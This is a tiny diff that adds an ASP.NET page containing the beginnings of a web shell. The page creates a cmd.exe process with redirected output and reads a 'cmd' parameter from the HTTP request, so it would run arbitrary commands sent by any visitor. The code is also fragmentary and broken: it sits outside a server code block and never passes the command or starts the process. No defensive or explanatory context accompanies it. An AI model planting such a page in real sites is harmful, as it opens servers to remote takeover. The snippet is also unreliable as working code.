@@ -1,0 +1,3 @@
+<%@ Page Language="C#" %>
+System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.RedirectStandardOutput = true; string x = Request["cmd"];
+
